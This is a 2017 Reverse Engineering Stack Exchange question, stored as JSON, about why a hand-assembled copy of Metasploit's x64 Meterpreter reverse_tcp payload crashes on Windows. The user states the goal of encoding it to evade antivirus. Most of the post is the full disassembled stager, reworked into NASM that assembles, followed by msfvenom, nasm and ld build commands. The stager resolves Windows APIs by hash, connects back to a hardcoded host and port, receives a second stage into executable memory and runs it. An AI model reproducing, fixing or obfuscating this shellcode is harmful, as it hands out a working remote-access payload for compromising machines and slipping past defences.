{
    "title": "X64 ASSEMBLY - Cannot run compiled and linked raw shellcode in Windows",
    "link": "https://reverseengineering.stackexchange.com/questions/15362/x64-assembly-cannot-run-compiled-and-linked-raw-shellcode-in-windows",
    "content": "After using metasploit's windows/x64/meterpreter/reverse_tcp shellcode on my windows 10 machine (with AVs turned off), I decided to try to create a hand-made polymorphic, null-free and custom-encoded version of the same shellcode (with the hope of evading my AVs).\nTo test my work flow, I produced a raw output of the shellcode using:\n\nmsfvenom -p windows/x64/meterpreter/reverse_tcp -f raw -a x64\n  --platform windows LHOST='my IP address' | ndisasm -b 64 -\n\n<pre><code>global _start\nsection .text\n\n_start:\n\ncld                                 \nand rsp,byte -0x10                  \ncall first_call ;dword 0xd6         \npush r9                            \npush r8\npush rdx\npush rcx\npush rsi\nxor rdx,rdx\nmov rdx,[gs:rdx+0x60]\nmov rdx,[rdx+0x18]\nmov rdx,[rdx+0x20]\n\n\nfifth_jmp:\n\nmov rsi,[rdx+0x50]\nmovzx rcx,word [rdx+0x4a]\nxor r9,r9\nxor rax,rax\nlodsb\ncmp al,0x61\njl 0x37\nsub al,0x20\nror r9d,0xd\nadd r9d,eax\nloop 0x2d\n\npush rdx\npush r9\nmov rdx,[rdx+0x20]\nmov eax,[rdx+0x3c]\nadd rax,rdx\ncmp word [rax+0x18],0x20b\njnz first_jmp ;dword 0xcb\n\nmov eax,[rax+0x88]\ntest rax,rax\njz first_jmp ;0xcb\n\nadd rax,rdx\npush rax\nmov ecx,[rax+0x18]\nmov r8d,[rax+0x20]\nadd r8,rdx\n\nfourth_jmp:\n\njrcxz second_jmp ;0xca\n\ndec rcx\nmov esi,[r8+rcx*4]\nadd rsi,rdx\nxor r9,r9\n\nthird_jmp:\n\nxor rax,rax\nlodsb\nror r9d,0xd\nadd r9d,eax\ncmp al,ah\njnz third_jmp \n\nadd r9,[rsp+0x8]\ncmp r9d,r10d\njnz fourth_jmp ;0x72\n\npop rax\nmov r8d,[rax+0x24]\nadd r8,rdx\nmov cx,[r8+rcx*2]\nmov r8d,[rax+0x1c]\nadd r8,rdx\nmov eax,[r8+rcx*4]\nadd rax,rdx\npop r8\npop r8\npop rsi\npop rcx\npop rdx\npop r8\npop r9\npop r10\nsub rsp,byte +0x20\npush r10\njmp rax\n\n\nsecond_jmp:\n\npop rax\n\n\nfirst_jmp:  \n\npop r9\npop rdx\nmov rdx,[rdx]\njmp dword fifth_jmp ;0x21\n\n\nfirst_call:\n\npop rbp                         \nmov r14,0x32335f327377          \npush r14                        \nmov r14,rsp                     \nsub rsp,0x1a0                   \nmov r13,rsp                     \nmov r12,0x6900a8c05c110002      \npush r12                        \nmov r12,rsp                     \nmov rcx,r14                     \nmov r10d,0x726774c              \ncall rbp                        \n\n\nmov rdx,r13\npush dword 0x101\npop rcx\nmov r10d,0x6b8029\ncall rbp\n\n\npush byte +0x5\npop r14\n\n\nninth_jmp:\n\npush rax\npush rax\nxor r9,r9\nxor r8,r8\ninc rax\nmov rdx,rax\ninc rax\nmov rcx,rax\nmov r10d,0xe0df0fea\ncall rbp\n\n\nmov rdi,rax\n\nsixth_jmp:  \n\npush byte +0x10\npop r8\nmov rdx,r12\nmov rcx,rdi\nmov r10d,0x6174a599\ncall rbp\n\n\ntest eax,eax\njz 0x15e\ndec r14\njnz sixth_jmp ;0x13e\n\n\ncall second_call ;dword 0x1f1\n\n\nsub rsp,byte +0x10\nmov rdx,rsp\nxor r9,r9\npush byte +0x4\npop r8\nmov rcx,rdi\nmov r10d,0x5fc8d902\ncall rbp\n\n\ncmp eax,byte +0x0\njng seventh_jmp ;0x1d1\n\n\nadd rsp,byte +0x20\npop rsi\nmov esi,esi\npush byte +0x40\npop r9\npush dword 0x1000\npop r8\nmov rdx,rsi\nxor rcx,rcx\nmov r10d,0xe553a458\ncall rbp\n\n\nmov rbx,rax\nmov r15,rax\n\n\ntenth_jmp:\n\nxor r9,r9\nmov r8,rsi\nmov rdx,rbx\nmov rcx,rdi\nmov r10d,0x5fc8d902\ncall rbp\n\n\ncmp eax,byte +0x0\njnl eighth_jmp ;0x1e3\n\n\npop rax\npush r15\npop rcx\npush dword 0x4000\npop r8\npush byte +0x0\npop rdx\nmov r10d,0x300f2f0b\ncall rbp\n\n\nseventh_jmp:\n\npush rdi\npop rcx\nmov r10d,0x614d6e75\ncall rbp\n\n\ndec r14\njmp ninth_jmp ;0x11f\n\n\neighth_jmp:\n\nadd rbx,rax\nsub rsi,rax\ntest rsi,rsi\njnz tenth_jmp ;0x1a2\njmp r15\n\n\nsecond_call:\n\npop rax\npush byte +0x0\npop rcx\nmov r10,0x56a2b5f0\ncall rbp\n</code></pre>\nBefore making any changes to the ndisasm output (apart from modifying the call and jmp destinations from relative addresses to labels, see code above), I compiled and linked the output using:\n\nnasm -f win64 -o meterpreter_reverse_tcp.o meterpreter_reverse_tcp.asm\n/opt/mingw/x86_64-w64-mingw32/bin/ld -o meterpreter_reverse_tcp.exe\n  meterpreter_reverse_tcp.o\n\nBut when I ran the .exe on my windows 10 machine, I got the following error:\n\nMeterpreter_reverse_tcp.exe has stopped working. A problem caused the\n  program to stop working correctly. Windows will close the program and\n  notify you if a solution is available.\n\nThe output of the command 'file meterpreter_reverse_tcp.exe' is:\n\nmeterpreter_reverse_tcp.exe: PE32+ executable (console) x86-64\n  (stripped to external PDB), for MS Windows\n\nWhat did I do wrong ?\nAs a side note, I know the obvious solution would be to debug the .exe on the Windows machine. I am presently learning how to use debbugers on Windows for programs compiled and linked on Linux. The goal here is to understand if an error occured during the process I described in my question.\n",
    "votes": "1",
    "answers": 0,
    "views": "328",
    "tags": [
        "windows",
        "assembly",
        "linux",
        "shellcode"
    ],
    "user": "adam",
    "time": "May 20, 2017 at 17:37",
    "comments": [
        {
            "user": "Kerim Can Kalıpcıoğlu",
            "text": "Can you share executable? I can make it myself but, it is better if you share yours. Did you tried to assemble and link with another tools?\n",
            "time": null
        }
    ],
    "answers_data": []
}